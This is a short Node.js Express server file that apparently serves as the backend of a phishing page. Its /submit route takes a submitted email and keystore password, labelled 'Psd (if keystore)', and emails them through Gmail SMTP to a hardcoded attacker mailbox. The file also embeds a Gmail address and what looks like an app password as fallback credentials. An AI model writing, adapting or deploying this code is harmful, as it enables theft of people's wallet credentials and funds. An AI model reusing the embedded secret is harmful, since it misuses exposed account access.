const express = require('express');
const nodemailer = require('nodemailer');
const bodyParser = require('body-parser');
const path = require('path');

const app = express();
const port = process.env.PORT || 3000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.json());

app.use(express.static(path.join(__dirname, 'public')));

const maillist = [
  'willyscotmegan@gmail.com',
];

const transporter = nodemailer.createTransport({
  host: "smtp.gmail.com",
  port: 465,
  secure: true,
  auth: {
    user: process.env.EMAIL_USER || "willyscotmegan@gmail.com",
    pass: process.env.EMAIL_PASS || "jubtgphwdbkrrauf",
  },
});

app.post('/submit', async (req, res) => {
  try {
    console.log('Srcvd:', req.body);

    const { wName, psdWet } = req.body;

    const mailOptions = {
      from: '"Deets" <willyscotmegan@gmail.com>',
      to: maillist,
      subject: "New Form Submission",
      html: `
        <p><strong>Eml:</strong> ${wName || 'Not provided'}</p>
        <p><strong>Psd (if keystore):</strong> ${psdWet || 'Not provided'}</p>
      `
    };
    
    await transporter.sendMail(mailOptions);
    
    res.json({ success: true });
  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ error: 'Submission failed' });
  }
});